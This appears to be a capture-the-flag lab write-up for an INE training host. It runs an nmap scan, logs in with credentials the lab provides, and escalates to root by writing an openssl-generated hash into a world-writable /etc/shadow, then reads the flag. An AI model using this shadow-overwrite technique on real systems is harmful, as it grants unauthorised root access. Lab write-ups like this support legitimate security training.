*domain*: target2.ine.local
*ip* : 192.96.27.3
*credentials* : `john:Pass@john123`

----
# enumeration
## nmap scan
```shell
nmap -sV -A -T4 target2.ine.local

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:04:bc:40:42:db:f9:dc:cb:f6:d8:cd:23:5f:8b:4e (ECDSA)
|_  256 4b:a5:e1:5b:3c:0f:40:db:30:44:a2:d0:08:15:b7:88 (ED25519)

25/tcp open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2024-11-14T07:57:18
|_Not valid after:  2034-11-12T07:57:18
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: localhost.members.linode.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)

MAC Address: 02:42:C0:60:1B:03 (Unknown)

```

# post-exploitation
## Gaining ssh access using provided creds
```shell
ssh john@target2.ine.local  
- whoami
	john

john@target2:~$ ls -la /etc/shadow
-rw-rw-rw- 1 root shadow 959 Nov 14 07:58 /etc/shadow
# shadow has read write permission for all users . this is misconfig
#generate new password hash
john@target2:~$ openssl passwd -1 -salt abc Hacked@123
$1$abc$YcRzKc3nhBt75Kdq2UGSL/


# edit in /etc/shadow for root user
# place hash in between *
john@target2:~$ su root
Password: 
root@target2:/home/john# 
# flag
root@target2:~# cat /root/flag.txt
FLAG5_8ad175f18e03455c8afe5a2d43eae65a
```